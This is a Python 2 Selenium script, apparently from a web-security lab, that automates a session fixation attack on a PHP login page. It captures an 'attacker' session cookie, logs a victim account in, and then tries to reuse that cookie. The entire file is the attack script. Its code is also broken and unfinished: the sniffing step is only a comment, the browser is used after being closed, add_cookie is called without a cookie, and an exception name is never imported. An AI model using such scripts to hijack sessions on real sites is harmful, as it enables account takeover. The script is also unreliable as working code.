
# For session fixation attack
# 1. Log in as normal user i.e. bryce, so that the attacker can get the cookie
# 2. Clear the session for the attacker to fix the session

# For automation of login
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import requests, time
from sniffer import *

class Client_Session_Fixation:
	def __init__(self, url, elname, elpwd, user, pwd):
		self._url = url
		self._elname = elname
		self._elpwd = elpwd
		self._user = user
		self._pwd = pwd

	def start_exploit(self):
		caps = DesiredCapabilities.FIREFOX
		caps["marionette"] = True
		caps["binary"] = "/usr/bin/firefox"

		# Get a random PHPSESSID first.
		driver = webdriver.Firefox(capabilities=caps, executable_path='./geckodriver')
		driver.get(self._url)

		attacker_cookie = driver.get_cookies()
		print 'Attacker cookie: '
		print attacker_cookie

		# Close attacker window
		driver.quit()

		time.sleep(2)

		# Start sniffing here and change packet.

		# Open the browser and go to website
		driver = webdriver.Firefox(capabilities=caps, executable_path='./geckodriver')
		driver.get(self._url)

		self._login(driver)

		# Close the browser so that we can initiate a new session.
		driver.quit()

		# Wait for driver to deinit.
		time.sleep(2)

		# Open attacker window
		driver.get(self._url)
		driver.delete_all_cookies()
		driver.add_cookie()

	def _login(self, driver):
		username_field = driver.find_element_by_name(self._elname)
		password_field = driver.find_element_by_name(self._elpwd)
		try:
			login_button = driver.find_element_by_xpath('//input[@type="submit"]')
		except NoSuchElementException:
			login_button = driver.find_element_by_xpath('//button[@type="submit"]')
		username_field.send_keys(self._user)
		password_field.send_keys(self._pwd)
		login_button.click()


fixation = Client_Session_Fixation('https://app5.com/www/index.php', 'login', 'password', 'student', 'student')
fixation.start_exploit()
